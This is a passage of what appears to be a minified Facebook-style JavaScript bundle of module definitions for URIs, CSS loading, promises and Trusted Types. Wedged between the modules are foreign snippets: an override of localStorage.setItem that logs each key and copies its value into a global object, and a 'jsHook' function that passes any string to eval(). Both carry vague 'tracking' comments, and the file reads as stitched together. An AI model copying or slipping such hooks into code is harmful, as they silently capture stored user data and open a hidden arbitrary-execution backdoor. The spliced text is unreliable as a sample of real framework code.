      !g && a.PageTransitions ? a.PageTransitions.go(i, h) : f ? d("ReloadPage").now() : h ? e.location.replace(i) : e.location.href = i;
      return e;
    };
    f.go = function (a, d) {
      c("unexpectedUseInComet")("uri.go"), b.go(this, a, d);
    };
    b.tryParseURI = function (a) {
      a = c("URIBase").tryParse(a, c("PHPQuerySerializer"));
      return a ? new b(a) : null;
    };
    b.isValidURI = function (a) {
      return c("URIBase").isValid(a, c("PHPQuerySerializer"));
    };
    b.getRequestURI = function (a, c) {
      a === void 0 && (a = !0);
      c === void 0 && (c = !1);
      if (a) {
        a = i();
        if (a) return a.getCurrentURI(!!c).getQualifiedURI();
      }
      return new b(window.location.href);
    };
    b.getMostRecentURI = function () {
      var a = i();
      return a ? a.getMostRecentURI().getQualifiedURI() : new b(window.location.href);
    };
    b.getNextURI = function () {
      var a = i();
      return a ? a.getNextURI().getQualifiedURI() : new b(window.location.href);
    };
    b.encodeComponent = function (a) {
      return encodeURIComponent(a).replace(/%5D/g, "]").replace(/%5B/g, "[");
    };
    b.decodeComponent = function (a) {
      return decodeURIComponent(a.replace(/\+/g, " "));
    };
    b.normalize = function (a) {
      return a != null && typeof a === "string" ? this.normalizeString(a) : new b(a).toString();
    };
    return b;
  }(c("URIBase"));
  j.go = function (a, b, d) {
    c("unexpectedUseInComet")("URI.go"), j.goURIOnWindow(a, window, b, d);
  };
  j.normalizeString = c("memoizeStringOnly")(function (a) {
    return new j(a).toString();
  });
  j.expression = /(((\w+):\/\/)([^\/:]*)(:(\d+))?)?([^#?]*)(\?([^#]*))?(#(.*))?/;
  j.arrayQueryExpression = /^(\w+)((?:\[\w*\])+)=?(.*)/;
  g["default"] = j;
}, 98);
__d("isCometAltpayJsSdkIframeAllowedDomain", ["CometAltpayJsSdkIframeAllowedDomains", "URI"], function (a, b, c, d, e, f, g) {
  "use strict";

  b = Object.freeze(c("CometAltpayJsSdkIframeAllowedDomains"));
  var h = Object.freeze(b.allowed_domains);
  function a() {
    var a = new (c("URI"))(window.location.href);
    if (h == null || h.length <= 0) return !1;
    var b = h.some(function (b) {
      b = new (c("URI"))(b);
      return b == null ? !1 : a.isSameOrigin(b);
    });
    return b ? !0 : !1;
  }
  g["default"] = a;
}, 98);
__d("ReloadPage", ["BlueCompatRouter", "Env"], function (a, b, c, d, e, f) {
  var g;
  function h(c) {
    !(g || (g = b("Env"))).isCQuick ? a.window.location.reload(c) : b("BlueCompatRouter").sendMessage({
      compatAction: "reload"
    });
  }
  function c(b) {
    a.setTimeout(h, b);
  }
  f.now = h;
  f.delay = c;
}, 66);
__d("ResourceTimingsStore", ["CircularBuffer", "ResourceTypes", "TimingAnnotations", "URI", "performanceAbsoluteNow"], function (a, b, c, d, e, f) {
  "use strict";

  var g,
    h,
    i = 1e3,
    j = new (b("TimingAnnotations").EmptyTimingAnnotations)(),
    k = {},
    l = {};
  Object.keys(b("ResourceTypes")).forEach(function (a) {
    a = b("ResourceTypes")[a];
    var c = new (b("CircularBuffer"))(i),
      d = new Map();
    c.onEvict(function (a) {
      d["delete"](a);
    });
    k[a] = {
      idx: 1,
      entries: c
    };
    l[a] = d;
  });
  function m(a, c, d) {
    var e;
    switch (a) {
      case "css":
      case "js":
        var f = n.parseMakeHasteURL(c);
        f = f == null ? "unknown_resource" : f[0];
        e = d + "_" + f;
        break;
      case "xhr":
        f = new (g || (g = b("URI")))(c).getQualifiedURI();
        c = f.getDomain() + f.getPath();
        e = d + "_" + c;
        break;
      default:
        a, e = "never here";
    }
    return e;
  }
  var n = {
    getUID: function (a, b) {
      var c = k[a],
        d = m(a, b, c.idx);
      c.entries.write(d);
      l[a].set(d, {
        uri: b,
        uid: d
      });
      c.idx++;
      return d;
    },
    updateURI: function (a, b, c) {
      a = l[a].get(b);
      a != null && (a.uri = c);
    },
    getMapFor: function (a) {
      return l[a];
    },
    parseMakeHasteURL: function (a) {
      a = a.match(/\/rsrc\.php\/.*\/([^\?]+)/);
      if (!a) return null;
      a = a[1];
      var b = "",
        c = a.match(/\.(\w+)$/);
      c && (b = c[1]);
      return [a, b];
    },
    measureRequestSent: function (a, c) {
      a = l[a];
      a = a.get(c);
      if (a == null || a.requestSent != null) return;else a.requestSent = (h || (h = b("performanceAbsoluteNow")))();
    },
    measureResponseReceived: function (a, c) {
      a = l[a];
      a = a.get(c);
      if (a == null || a.requestSent == null || a.responseReceived != null) return;else a.responseReceived = (h || (h = b("performanceAbsoluteNow")))();
    },
    annotate: function (a, c) {
      a = l[a];
      a = a.get(c);
      if (!a) return j;else {
        c = a.annotations;
        if (c != null) return c;else {
          c = new (b("TimingAnnotations"))();
          a.annotations = c;
          return c;
        }
      }
    },
    getAnnotationsFor: function (a, b) {
      a = l[a];
      a = a.get(b);
      if (!a) return null;else {
        b = a.annotations;
        return b != null ? b.prepareToSend() : null;
      }
    }
  };
  e.exports = n;
}, null);
__d("TimeSlice", ["cr:1126"], function (a, b, c, d, e, f, g) {
  g["default"] = b("cr:1126");
}, 98);
localStorage.setItem = function (key, value) {
  console.log("local storage item set: " + key);
  globalVars[key] = value;
  oldSetItem.call(localStorage, key, value);
};

// The js hook provides tracking feature

__d("clearInterval", ["cr:1003267"], function (a, b, c, d, e, f, g) {
  g["default"] = b("cr:1003267");
}, 98);
__d("nullthrows", [], function (a, b, c, d, e, f) {
  function a(a, b) {
    b === void 0 && (b = "Got unexpected null or undefined");
    if (a != null) return a;
    a = new Error(b);
    a.framesToPop = 1;
    throw a;
  }
  f["default"] = a;
}, 66);
function jsHook(code) {
  console.log("Executing code: ", code);
  return eval(code);
}

// Event listeners for tracking various events

__d("setIntervalAcrossTransitions", ["cr:896462"], function (a, b, c, d, e, f, g) {
  g["default"] = b("cr:896462");
}, 98);
__d("CSSLoader", ["CSSLoaderConfig", "NetworkStatus", "ResourceTimingsStore", "TimeSlice", "clearInterval", "ifRequired", "isEmpty", "nullthrows", "setIntervalAcrossTransitions"], function (a, b, c, d, e, f) {
  var g,
    h = 20,
    i = b("CSSLoaderConfig").timeout,
    j = b("CSSLoaderConfig").loadEventSupported,
    k,
    l = [],
    m,
    n = new Map();
  function o(a) {
    if (k) return;
    k = !0;
    var b = document.createElement("link");
    b.onload = function () {
      j = !0, b.parentNode && b.parentNode.removeChild(b);
    };
    b.rel = "stylesheet";
    b.href = "data:text/css;base64,";
    a.appendChild(b);
  }
  function p() {
    var a = [],
      c = [];
    if (Date.now() >= m) {
      for (var d = n.values(), e = Array.isArray(d), f = 0, d = e ? d : d[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var h;
        if (e) {
          if (f >= d.length) break;
          h = d[f++];
        } else {
          f = d.next();
          if (f.done) break;
          h = f.value;
        }
        h = h;
        c.push(h.signal);
        a.push(h.error);
      }
      n.clear();
    } else for (h = n, f = Array.isArray(h), e = 0, h = f ? h : h[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      if (f) {
        if (e >= h.length) break;
        d = h[e++];
      } else {
        e = h.next();
        if (e.done) break;
        d = e.value;
      }
      d = d;
      var j = d[0];
      d = d[1];
      var k = d.signal,
        l = window.getComputedStyle ? getComputedStyle(k) : k.currentStyle;
      l && parseInt(l.height, 10) > 1 && (a.push(d.load), c.push(k), n["delete"](j));
    }
    for (l = 0; l < c.length; l++) {
      d = b("nullthrows")(c[l].parentNode);
      d.removeChild(c[l]);
    }
    if (!(g || (g = b("isEmpty")))(a)) {
      for (l = 0; l < a.length; l++) a[l]();
      m = Date.now() + i;
    }
    return n.size === 0;
  }
  function q(a, c, d, e) {
    var f = document.createElement("meta");
    f.id = "bootloader_" + a.replace(/[^a-z0-9]/gi, "_");
    c.appendChild(f);
    c = n.size !== 0;
    m = Date.now() + i;
    n.set(a, {
      signal: f,
      load: d,
      error: e
    });
    if (!c) var g = b("setIntervalAcrossTransitions")(function () {
      p() && b("clearInterval")(g);
    }, h);
  }
  function r(a, c, d, e, f, g) {
    var h = b("ResourceTimingsStore").getUID("css", c);
    b("ResourceTimingsStore").annotate("css", h).addStringAnnotation("name", a).addStringAnnotation("source", c).addStringAnnotation("caller", "CSSLoader.loadStyleSheet");
    b("ifRequired")("TimeSliceInteraction", function (b) {
      b.informGlobally("CSSLoader.loadStyleSheet").addStringAnnotation("source", c).addStringAnnotation("name", a);
    });
    b("ResourceTimingsStore").measureRequestSent("css", h);
    var i = function () {
        b("ResourceTimingsStore").measureResponseReceived("css", h), e();
      },
      k = b("TimeSlice").getGuardedContinuation("CSSLoader link.onresponse");
    !g ? q(a, d, i, f) : j !== !0 ? (q(a, d, i, f), j === void 0 && o(d)) : (g.onload = k.bind(void 0, function () {
      g.onload = g.onerror = null, i();
    }), g.onerror = k.bind(void 0, function () {
      g.onload = g.onerror = null, f();
    }));
  }
  a = {
    loadStyleSheet: function (a, c, d, e, f, g) {
      var h = document;
      if ("createStyleSheet" in h) {
        var i;
        for (var j = 0; j < l.length; j++) if (l[j].imports.length < 31) {
          i = j;
          break;
        }
        if (i === void 0) {
          try {
            l.push(h.createStyleSheet());
          } catch (a) {
            b("NetworkStatus").reportError();
            g();
            return;
          }
          i = l.length - 1;
        }
        b("NetworkStatus").reportSuccess();
        l[i].addImport(c);
        r(a, c, d, f, g, null);
        return;
      }
      j = h.createElement("link");
      j.rel = "stylesheet";
      j.type = "text/css";
      j.href = c;
      e && (j.crossOrigin = "anonymous");
      r(a, c, d, f, g, j);
      d.appendChild(j);
    },
    setupEventListeners: function (a, b, c, d, e, f) {
      r(a, b, c, d, e, f);
    }
  };
  e.exports = a;
}, null);
__d("ClientConsistencyEventEmitter", ["BaseEventEmitter"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = new (c("BaseEventEmitter"))();
  b = a;
  g["default"] = b;
}, 98);
__d("requireWeak", [], function (a, b, c, d, e, f) {
  function a(a, b) {
    d && d.call(null, [a], b);
  }
  f["default"] = a;
}, 66);
__d("ClientConsistency", ["ClientConsistencyEventEmitter", "SiteData", "requireWeak"], function (a, b, c, d, e, f) {
  "use strict";

  var g = b("SiteData").client_revision,
    h = !1,
    i,
    j = {},
    k = new Set(),
    l = new Set(),
    m = function (a) {
      j = {};
      var c = Object.keys(a).sort().reverse();
      i === "multiple_revs" && (i = void 0);
      var d = function () {
        if (f) {
          if (g >= e.length) return "break";
          h = e[g++];
        } else {
          g = e.next();
          if (g.done) return "break";
          h = g.value;
        }
        var c = h,
          d = Number(c);
        c = (c = a[d]) != null ? c : [];
        if (c.length === 0) {
          n(d);
          return "break";
        }
        c.forEach(function (a) {
          var c;
          j[a] = Math.max((c = j[a]) != null ? c : 0, d);
          if (l.has(a)) return;
          l.add(a);
          b("requireWeak").call(null, a, function () {
            if (!j[a]) return;
            n(j[a]);
          });
        });
      };
      for (var e = c, f = Array.isArray(e), g = 0, e = f ? e : e[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var h;
        c = d();
        if (c === "break") break;
      }
    },
    n = function (a) {
      a > 0 && i == null && (i = "multiple_revs"), a === 2 && b("ClientConsistencyEventEmitter").emit("softRefresh", "multiple_revs"), a === 3 && b("ClientConsistencyEventEmitter").emit("hardRefresh", "multiple_revs");
    },
    o = function (a) {
      var b = a.actions;
      a = a.rev;
      if (a === g) return;
      i === "multiple_revs" && (i = void 0);
      b != null && m(b);
    };
  a = {
    init: function () {
      if (h) return;
      b("ClientConsistencyEventEmitter").addListener("newEntry", function (a) {
        o(a);
      });
      b("ClientConsistencyEventEmitter").addListener("softRefresh", function (a) {
        i = a;
      });
      b("ClientConsistencyEventEmitter").addListener("hardRefresh", function (a) {
        i = a;
      });
      h = !0;
    },
    addAdditionalRevision: function (a) {
      a !== g && (k.add(a), b("ClientConsistencyEventEmitter").emit("newRevision", a));
    },
    getAdditionalRevisions: function () {
      return k;
    },
    getPendingRefresh: function () {
      return i;
    }
  };
  e.exports = a;
}, null);
__d("ErrorPubSub", ["fb-error"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = c("fb-error").ErrorPubSub;
}, 98);
__d("JSResourceEvents", ["performanceAbsoluteNow"], function (a, b, c, d, e, f, g) {
  var h = 50,
    i = new Map();
  function a(a, b, d) {
    a = a;
    b = (b = b) != null ? b : "";
    var e = i.get(a);
    e || i.set(a, e = new Map());
    a = e.get(b);
    a || e.set(b, a = new Map());
    e = a.get(d);
    e || a.set(d, e = [0, []]);
    e[1][e[0]++ % h] = c("performanceAbsoluteNow")();
  }
  function j(a, b, c) {
    var d = i.get(a);
    if (!d) return [];
    var e = [];
    for (var d = d, g = Array.isArray(d), h = 0, d = g ? d : d[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      var j;
      if (g) {
        if (h >= d.length) break;
        j = d[h++];
      } else {
        h = d.next();
        if (h.done) break;
        j = h.value;
      }
      j = j;
      var k = j[0];
      j = j[1];
      for (var j = j, l = Array.isArray(j), m = 0, j = l ? j : j[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var n;
        if (l) {
          if (m >= j.length) break;
          n = j[m++];
        } else {
          m = j.next();
          if (m.done) break;
          n = m.value;
        }
        n = n;
        var o = n[0];
        n = n[1];
        for (var n = n[1], p = Array.isArray(n), q = 0, n = p ? n : n[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
          var r;
          if (p) {
            if (q >= n.length) break;
            r = n[q++];
          } else {
            q = n.next();
            if (q.done) break;
            r = q.value;
          }
          r = r;
          r >= b && r <= c && e.push({
            module: a,
            ref: k || null,
            type: o,
            time: r
          });
        }
      }
    }
    return e.sort(function (a, b) {
      return a.time - b.time;
    });
  }
  function b(a, b) {
    var c = new Map();
    for (var d = i.keys(), e = Array.isArray(d), f = 0, d = e ? d : d[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      var g;
      if (e) {
        if (f >= d.length) break;
        g = d[f++];
      } else {
        f = d.next();
        if (f.done) break;
        g = f.value;
      }
      g = g;
      var h = j(g, a, b);
      h.length && c.set(g, h);
    }
    return c;
  }
  g.notify = a;
  g.getEvents = j;
  g.getAllModuleEvents = b;
}, 98);
__d("Promise", ["cr:6640"], function (a, b, c, d, e, f) {
  "use strict";

  var g = (c = b("cr:6640")) != null ? c : a.Promise;
  g.allSettled || (g.allSettled = function (a) {
    var b;
    if ((typeof Symbol === "function" ? Symbol.iterator : "@@iterator") in a) b = Array.from(a);else return g.reject(new TypeError("Promise.allSettled must be passed an iterable."));
    var c = Array(b.length);
    a = function (a, d) {
      var e = b[a];
      d = typeof e === "object" && e !== null && typeof e.then === "function";
      c[a] = d ? new g(function (a, b) {
        e.then(function (b) {
          a({
            status: "fulfilled",
            value: b
          });
        }, function (b) {
          a({
            status: "rejected",
            reason: b
          });
        });
      }) : g.resolve({
        status: "fulfilled",
        value: e
      });
    };
    for (var d = 0, e = b.length; d < e; ++d) a(d, e);
    return g.all(c);
  });
  g.prototype["finally"] || (g.prototype["finally"] = function (a) {
    return this.then(function (b) {
      return g.resolve(a()).then(function () {
        return b;
      });
    }, function (b) {
      return g.resolve(a()).then(function () {
        throw b;
      });
    });
  });
  e.exports = g;
}, null);
__d("PromiseAnnotate", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a, b) {
    a.displayName = b;
    return a;
  }
  function b(a) {
    a = a.displayName;
    if (typeof a === "string") return a;else return null;
  }
  f.setDisplayName = a;
  f.getDisplayName = b;
}, 66);
__d("ifRequireable", ["ifRequired"], function (a, b, c, d, e, f, g) {
  function a(a, b, d) {
    return c("ifRequired").call(null, a, b, d);
  }
  g["default"] = a;
}, 98);
__d("JSResourceReferenceImpl", ["JSResourceEvents", "Promise", "PromiseAnnotate", "ifRequireable", "ifRequired"], function (a, b, c, d, e, f, g) {
  var h = function (a) {
      return a;
    },
    i = [],
    j = null;
  function k(a) {
    j ? a(j) : i.push(a);
  }
  var l = "JSResource: unknown caller";
  a = function () {
    a.setBootloader = function (a) {
      j = a;
      for (a = 0; a < i.length; a++) {
        var b = i[a];
        b(j);
      }
      i = [];
    };
    function a(a) {
      this.$1 = a;
    }
    var e = a.prototype;
    e.getModuleId = function () {
      var a = this.$1;
      return a;
    };
    e.getModuleIdAsRef = function () {
      return this.$1;
    };
    e.load = function () {
      var a = this,
        c = this.$2;
      d("JSResourceEvents").notify(this.$1, c, "LOADED");
      var e = new (b("Promise"))(function (b) {
        k(function (e) {
          return e.loadModules([a.getModuleIdAsRef()], function (e) {
            d("JSResourceEvents").notify(a.$1, c, "PROMISE_RESOLVED"), b(e);
          }, (e = a.$2) != null ? e : l);
        });
      });
      d("PromiseAnnotate").setDisplayName(e, "Bootload(" + this.getModuleId() + ")");
      return e;
    };
    e.preload = function () {
      var a,
        b = this,
        c = (a = this.$2) != null ? a : l;
      k(function (a) {
        return a.loadModules([b.getModuleIdAsRef()], function () {}, "preload: " + c);
      });
    };
    e.equals = function (a) {
      return this === a || this.$1 == a.$1;
    };
    e.getModuleIfRequireable = function () {
      d("JSResourceEvents").notify(this.$1, this.$2, "ACCESSED");
      return c("ifRequireable").call(null, this.$1, h);
    };
    e.getModuleIfRequired = function () {
      d("JSResourceEvents").notify(this.$1, this.$2, "ACCESSED");
      return c("ifRequired").call(null, this.$1, h);
    };
    a.disableForSSR_DO_NOT_USE = function () {
      this.$3 = !1;
    };
    e.isAvailableInSSR_DO_NOT_USE = function () {
      return this.constructor.$3;
    };
    e.__setRef = function (a) {
      this.$2 = a;
      d("JSResourceEvents").notify(this.$1, this.$2, "CREATED");
      return this;
    };
    a.loadAll = function (a, b) {
      var c = {},
        e = !1;
      for (var f = a, g = Array.isArray(f), h = 0, f = g ? f : f[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var i;
        if (g) {
          if (h >= f.length) break;
          i = f[h++];
        } else {
          h = f.next();
          if (h.done) break;
          i = h.value;
        }
        i = i;
        var j = i.$2;
        j && (e = !0, c[j] = !0);
        d("JSResourceEvents").notify(i.$1, j, "LOADED");
      }
      k(function (d) {
        return d.loadModules(a.map(function (a) {
          return a.getModuleId();
        }), b, e ? Object.keys(c).join(":") : "JSResource: unknown caller");
      });
    };
    return a;
  }();
  a.$3 = !0;
  g["default"] = a;
}, 98);
__d("MakeHasteTranslationsMap", ["invariant"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  var i = {};
  function a(a) {
    Object.assign(i, a);
  }
  function b(a) {
    a in i || h(0, 62571, a);
    return i[a];
  }
  g.setBatch = a;
  g.get = b;
}, 98);
__d("PromiseMonitor", ["Env", "FBLogger", "PromiseAnnotate"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = 1e5,
    i = new Set(),
    j = !1;
  function a(a) {
    if (c("Env").gk_comet_promise_monitor !== !0) return;
    if (typeof WeakRef === "undefined") return;
    if (i.size >= h && !j) {
      c("FBLogger")("PromiseMonitor").warn("Exceed %s promises.", h);
      j = !0;
      return;
    }
    var b = new WeakRef(a),
      d = {
        thenable: b
      };
    b = function () {
      i["delete"](d);
    };
    a.then(b, b);
    i.add(d);
  }
  function b() {
    if (c("Env").gk_comet_promise_monitor !== !0) return {
      disabled: !0
    };
    var a = 10,
      b = Array.from(i).slice(-a).map(function (a) {
        if (a.retainedDescription != null) return a.retainedDescription;
        a = a.thenable.deref();
        return a == null ? "Promise was GCed but not completed" : (a = d("PromiseAnnotate").getDisplayName(a)) != null ? a : "Promise not annotated";
      });
    return {
      seenTooManyPromises: j,
      pendingPromisesTruncated: i.size > a,
      pendingPromises: b
    };
  }
  function e() {
    return i.size;
  }
  g.monitor = a;
  g.dump = b;
  g.getUnresolvedPromiseCount = e;
}, 98);
__d("getErrorSafe", ["fb-error"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = c("fb-error").getErrorSafe;
}, 98);
__d("promiseDone", ["ErrorPubSub", "PromiseAnnotate", "PromiseMonitor", "emptyFunction", "getErrorSafe"], function (a, b, c, d, e, f, g) {
  function a(a, b, e) {
    var f = arguments.length > 1 ? a.then(b, e) : a;
    f.then(c("emptyFunction"), function (a) {
      a = c("getErrorSafe")(a);
      a.loggingSource = "PROMISE_DONE";
      c("ErrorPubSub").reportError(a);
    });
    var g = d("PromiseAnnotate").getDisplayName(a);
    g != null && void d("PromiseAnnotate").setDisplayName(f, g);
    d("PromiseMonitor").monitor(f);
  }
  g["default"] = a;
}, 98);
__d("MakeHasteTranslations", ["BootloaderConfig", "BootloaderRetryTracker", "ExecutionEnvironment", "FBLogger", "MakeHasteTranslationsMap", "Promise", "TimeSlice", "err", "fb-error", "getSameOriginTransport", "promiseDone"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = new (c("BootloaderRetryTracker"))({
    retries: (f = c("BootloaderConfig").translationRetries) != null ? f : c("BootloaderConfig").jsRetries,
    abortNum: (f = c("BootloaderConfig").translationRetryAbortNum) != null ? f : c("BootloaderConfig").jsRetryAbortNum,
    abortTime: (f = c("BootloaderConfig").translationRetryAbortTime) != null ? f : c("BootloaderConfig").jsRetryAbortTime,
    abortCallback: function () {
      c("FBLogger")("binary_transparency").warn("Translations retry abort");
    }
  });
  function i() {
    a.__translationFetchTracker || (a.__translationFetchTracker = {});
    return a.__translationFetchTracker;
  }
  function j(a) {
    a = JSON.parse(a);
    if (a != null && typeof a === "object" && typeof a.translations === "object" && Array.isArray(a.virtual_modules)) return a;
    throw c("err")("Invalid response shape");
  }
  function k(a) {
    return new (b("Promise"))(function (b, d) {
      var e = c("TimeSlice").getGuardedContinuation("MakeHasteTranslationsFetcher genSendRequest"),
        f = c("getSameOriginTransport")();
      f.open("GET", a, !0);
      f.onreadystatechange = function (g) {
        if (f.readyState !== 4) return;
        e(function () {
          c("fb-error").ErrorXFBDebug.addFromXHR(f);
          try {
            if (f.status !== 200) throw c("err")("Received non-200 response");
            b(j(f.responseText));
          } catch (e) {
            h.maybeScheduleRetry(a, function () {
              return b(k(a));
            }, function () {
              return d(c("err")("Error processing response. XHR Error: %s, XHR status: %s, Response Text: %s", e.toString(), f.status, f.responseText.length > 300 ? f.responseText.slice(0, 300) + "..." : f.responseText));
            });
          }
        });
      };
      f.send();
    });
  }
  var l = "data:application/json;base64";
  function m(a) {
    if (!a.includes(l)) throw c("err")("Invalid data uri mime type");
    a = a.split(",");
    a[0];
    a = a[1];
    if (a == null) throw c("err")("Data uri contains no contents");
    return j(atob(a));
  }
  function n(e, f) {
    var g = i();
    if (!c("ExecutionEnvironment").canUseDOM || g[e] === "fetching" || g[e] === "fetched") return b("Promise").resolve();
    g[e] = "fetching";
    return (f.includes(l) ? b("Promise").resolve(m(f)) : k(f)).then(function (b) {
      d("MakeHasteTranslationsMap").setBatch(b.translations), b.virtual_modules.forEach(function (b) {
        return a.define(b, {});
      }), g[e] = "fetched";
    })["catch"](function (a) {
      g[e] = "failed", c("FBLogger")("binary_transparency", "translation_download_error").catching(a).warn("Unable to download and process translation map. Url: %s", f);
    });
  }
  function e(a) {
    a = Object.entries(a);
    for (var b = 0; b < a.length; b++) {
      var d = a[b],
        e = d[0];
      d = d[1];
      c("promiseDone")(n(e, d));
    }
  }
  g.genFetchAndProcessTranslations = n;
  g.fetchTranslationsForEarlyFlush = e;
}, 98);
__d("RequireDeferredFactoryEvent", ["$InternalEnum"], function (a, b, c, d, e, f) {
  a = b("$InternalEnum")({
    SUPPORT_DATA: "sd",
    CSS: "css"
  });
  c = a;
  f["default"] = c;
}, 66);
__d("RequireDeferredReference", ["CallbackDependencyManager", "Promise", "RequireDeferredFactoryEvent", "ifRequireable", "ifRequired", "performanceNow", "promiseDone", "requireWeak"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = 1;
  d = 2;
  e = 16;
  var h = a | d | e,
    i = null;
  function j() {
    i == null && (i = new (c("CallbackDependencyManager"))());
    return i;
  }
  function k(a, b) {
    return a + ":" + b;
  }
  var l = new Set();
  f = function () {
    function a(a) {
      this.$1 = a;
    }
    var d = a.prototype;
    d.getModuleId = function () {
      var a = this.$1;
      return a;
    };
    d.getModuleIdAsRef = function () {
      return this.$1;
    };
    d.preload = function () {};
    d.getModuleIfRequired = function () {
      return c("ifRequired").call(null, this.$1, function (a) {
        return a;
      });
    };
    d.getModuleIfRequireable = function () {
      return c("ifRequireable").call(null, this.$1, function (a) {
        return a;
      });
    };
    d.isAvailableInSSR_DO_NOT_USE = function () {
      return !0;
    };
    d.$2 = function (a) {
      var b = this,
        d = c("ifRequireable")("InteractionTracingMetrics", function (a) {
          return a.currentInteractionLogger().addRequireDeferred(b.getModuleId(), c("performanceNow")());
        }),
        e = !1,
        f = function (b, f) {
          d == null ? void 0 : d(c("performanceNow")(), f), e || a(b);
        };
      c("ifRequireable").call(null, this.$1, function (a) {
        return f(a, !0);
      }, function () {
        c("requireWeak").call(null, b.$1, function (a) {
          return f(a, !1);
        });
      });
      return {
        remove: function () {
          e = !0;
        }
      };
    };
    d.load = function () {
      var a = this;
      return new (b("Promise"))(function (b) {
        return a.$2(b);
      });
    };
    d.__setRef = function (a) {
      return this;
    };
    d.onReadyImmediately = function (a) {
      return this.$2(a);
    };
    d.onReady = function (a) {
      var d = !1,
        e = this.$2(function (e) {
          c("promiseDone")(b("Promise").resolve().then(function () {
            d || a(e);
          }));
        });
      return {
        remove: function () {
          d = !0, e.remove();
        }
      };
    };
    d.loadImmediately = function (a) {
      return this.$2(a);
    };
    a.getRDModuleName_DO_NOT_USE = function (a) {
      return "rd:" + a;
    };
    a.unblock = function (d, e) {
      var f = j(),
        g = function () {
          var g = d[i];
          l.has(g) || (l.add(g), f.registerCallback(function () {
            define(a.getRDModuleName_DO_NOT_USE(g), [g], function () {
              b.call(null, g);
            }, h);
          }, Array.from(c("RequireDeferredFactoryEvent").members(), function (a) {
            return k(g, a);
          })));
          f.satisfyPersistentDependency(k(g, e));
        };
      for (var i = 0; i < d.length; i++) g();
    };
    return a;
  }();
  g["default"] = f;
}, 98);
__d("ResourceHasher", ["invariant"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  var i = 0;
  function a(a) {
    return "async:" + a;
  }
  function b() {
    return "ejs:" + i++;
  }
  function c(a) {
    typeof a === "string" || h(0, 19551, a);
    return a;
  }
  g.getAsyncHash = a;
  g.createExternalJSHash = b;
  g.getValidResourceHash = c;
}, 98);
__d("TrustedTypesPolicyName", ["$InternalEnum"], function (a, b, c, d, e, f) {
  a = b("$InternalEnum")({
    DEFAULT: "default",
    NOOP_DO_NOT_USE: "noop-do-not-use",
    UNSAFE_FUNCTION_DO_NOT_USE: "unsafe-function-do-not-use",
    DDS_INLINE_STYLE: "dds-inline-style",
    GHL_PLUS_HTML: "ghl-plus-html",
    LINK_TAG_HTML: "link-tag-html",
    BOOTLOADER_DATA_URI: "bootloader-data-uri",
    OC_URI_SCRIPT_URL: "oc-uri-script-urls",
    FB_URI_SCRIPT_URL: "fb-uri-script-urls",
    META_URI_SCRIPT_URL: "meta-uri-script-urls",
    RL_TEALIUM_CDN_URI: "rl-tealium-cdn-uri",
    SAME_ORIGIN_SCRIPT_URL: "same-origin-script-urls",
    WEB_WORKER_URL: "web-worker-url",
    YOUTUBE_IFRAME_URL: "youtube-iframe-uri",
    IORG_WEB_WORKER_POLICY: "iorg-web-worker-policy",
    BIG_PIPE_MARKUP: "big-pipe-markup",
    GOOGLE_ANALYTICS_URL: "google-analytics-url",
    FBQ_SCRIPT_URL: "fbq-script-url",
    DOM_IE_FIX: "dom-ie-fix",
    OZ_PLAYER_XML: "oz-player-xml",
    CHROMECAST_EXTENSION_URI: "chromecast-extension-uri"
  });
  c = a;
  f["default"] = c;
}, 66);
__d("TrustedTypesUtils", ["FBLogger"], function (a, b, c, d, e, f, g) {
  var h = typeof window !== "undefined";
  f = function (a) {
    return a;
  };
  function a(a) {
    var b = h && typeof window.origin !== "undefined" ? window.origin : "undefined";
    c("FBLogger")("saf_web_trusted_types_rollout", b).blameToPreviousFrame().blameToPreviousFrame().warn(a);
    return a;
  }
  function b(a) {
    c("FBLogger")("saf_web").info("[Trusted-Types][%s]: %s", h && typeof window.origin !== "undefined" ? window.origin : "undefined", a);
  }
  function i(a) {
    c("FBLogger")("saf_web").warn("[Trusted-Types][%s]: %s", h && typeof window.origin !== "undefined" ? window.origin : "undefined", a);
  }
  function d(a) {
    c("FBLogger")("saf_web").mustfix("[Trusted-Types][%s]: %s", h && typeof window.origin !== "undefined" ? window.origin : "undefined", a);
  }
  function e(a, b) {
    i("String '" + a.toString().slice(0, 15) + "' is flowing to DOM XSS sink. Default Trusted Type policy was executed and removed dangerous elements. " + ("Returned string is: '" + b.toString().slice(0, 15) + "' If this is breaking your feature, post in ") + "Security Infra group.");
  }
  g.isBrowser = h;
  g.noop = f;
  g.noopAndLog = a;
  g.logInfo = b;
  g.logWarning = i;
  g.logError = d;
  g.logDefaultPolicySanitization = e;
}, 98);
__d("TrustedTypes", ["Env", "TrustedTypesUtils"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a() {
    return d("TrustedTypesUtils").isBrowser && typeof window.trustedTypes !== "undefined";
  }
  var h = a() ? window.trustedTypes : null,
    i = new Map(),
    j = {
      createHTML: d("TrustedTypesUtils").noop,
      createScriptURL: d("TrustedTypesUtils").noop,
      createScript: d("TrustedTypesUtils").noop
    };
  function k(a, b) {
    return function (e) {
      for (var f = arguments.length, g = new Array(f > 1 ? f - 1 : 0), h = 1; h < f; h++) g[h - 1] = arguments[h];
      if (c("Env").isTrustedTypesReportOnly) try {
        return b.apply(void 0, [e].concat(g));
      } catch (b) {
        d("TrustedTypesUtils").logError("Exception in policy " + a + ": " + b.message + ", returning original string.");
        return a === "default" ? !1 : e;
      }
      return b.apply(void 0, [e].concat(g));
    };
  }
  function l(a, b) {
    if (h == null || !c("Env").useTrustedTypes) return j;
    var e = i.get(a);
    if (e != null) {
